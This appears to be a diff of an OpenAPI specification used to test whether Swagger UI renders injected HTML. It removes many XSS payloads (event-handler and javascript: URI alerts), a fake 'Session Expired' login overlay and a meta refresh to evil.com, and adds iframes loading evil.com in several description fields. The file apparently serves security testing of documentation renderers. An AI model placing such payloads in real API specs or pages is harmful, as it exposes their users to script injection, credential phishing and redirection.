@@ -1,38 +1,20 @@
 openapi: 3.0.3
 info:
-  title: Swagger XSS Test
-  version: "1.0.0"
+  title: Swagger iframe Injection Test
+  version: "1.0.1"
   description: |
-    <div style="background:yellow;padding:20px" onclick="alert('XSS Success!')">Click me!</div>
-    <iframe srcdoc="<script>alert(1)</script>"></iframe>
-    <math><mtext></mtext><script>alert(2)</script></math>
-    <details open ontoggle=alert(3)>Click for XSS</details>
-    <input autofocus onfocus=alert(4)>
-    <marquee onstart=alert(5)>marquee</marquee>
-    <object data="javascript:alert(6)"></object>
-    <video><source onerror="alert(7)"></video>
-    <form><button formaction="javascript:alert(8)">formXSS</button></form>
+    <iframe src="https://evil.com"></iframe>
 tags:
-  - name: test
+  - name: iframe-injection
     description: |
-      <form style="background:white;position:fixed;top:40%;left:40%;z-index:99999;padding:30px;border:2px solid red">
-        <h2>Session Expired</h2>
-        Username: <input><br>
-        Password: <input type='password'><br>
-        <button onclick="alert('Captured!')">Login</button>
-      </form>
-      <b onmouseover=alert(1)>expl</b>
-      <a href="javascript:alert('XSS')">Click me</a>
+      <iframe src="https://evil.com"></iframe>
 paths:
-  /test:
+  /iframe:
     get:
-      summary: "Test endpoint"
+      summary: "Test iframe injection endpoint"
       description: |
-        <details open ontoggle=alert('TestDescXSS')>Swagger details XSS</details>
-        <marquee onstart=alert('TestDesc2XSS')>marquee2</marquee>
-        <object data="javascript:alert('TestDesc3XSS')"></object>
+        <iframe src="https://evil.com"></iframe>
       responses:
         "200":
           description: |
-            <meta http-equiv="refresh" content="0;url=https://evil.com">
-            <b onmouseover=alert('200XSS')>mouseover here</b>
+            <iframe src="https://evil.com"></iframe>
